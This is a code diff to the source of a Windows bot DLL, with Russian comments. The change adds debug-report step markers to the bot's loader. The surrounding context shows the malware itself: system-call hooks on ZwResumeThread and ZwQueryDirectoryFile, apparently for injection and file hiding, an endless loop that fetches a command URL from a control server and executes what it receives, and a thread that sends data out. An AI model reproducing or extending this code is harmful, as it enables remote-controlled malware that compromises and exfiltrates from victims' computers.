@@ -28,12 +28,13 @@
 
 #include "md5.h"
 
+#include "DbgRpt.h"
+
 //#pragma comment(linker, "/ENTRY:MyDllMain" )
 
 //------------------------------------------------------------------------------
 //  Система отладочных строк
 //------------------------------------------------------------------------------
-
 #include "BotDebug.h"
 
 namespace DLLDBGTEMPLATES
@@ -73,6 +74,9 @@ DWORD WINAPI LoaderRoutine(LPVOID Data)
 	// Регистрируем глобальный менеджер задач
 	InitializeTaskManager(NULL, true);
 
+	// 402_pl запуск цикла получения команд (он получается в другом процессе)
+	PP_DBGRPT_FUNCTION_CALL(DebugReportStepByName("402_pl"));
+
 	// Вызываем событие
 	bool Cancel = false;
 	SVChostStart(NULL, Cancel);
@@ -80,6 +84,8 @@ DWORD WINAPI LoaderRoutine(LPVOID Data)
 	{
 		return 0; 
 	}
+
+
 
 
 	// Запускаем поток отправки данных
@@ -96,6 +102,9 @@ DWORD WINAPI LoaderRoutine(LPVOID Data)
 	DLLDBG("====>Bot Loader", "Стартуем выполнение команд");
 	while (true)
 	{
+		// 403_pl цикл получения команд
+		PP_DBGRPT_FUNCTION_CALL(DebugReportStepByName("403_pl"));
+
 		PCHAR URL = GetBotScriptURL(SCRIPT_TASK);
 
 		// Загружаем и выполняем команду
@@ -144,6 +153,9 @@ DWORD WINAPI ExplorerMain(LPVOID Data)
 
 	HookZwResumeThread();
 	HookZwQueryDirectoryFile();
+
+	// 401_pl запуск BotPlug
+	PP_DBGRPT_FUNCTION_CALL(DebugReportStepByName("401_pl"));
 
 		
 	DLLDBG("====>Bot DLL", "Стартуем Loader");
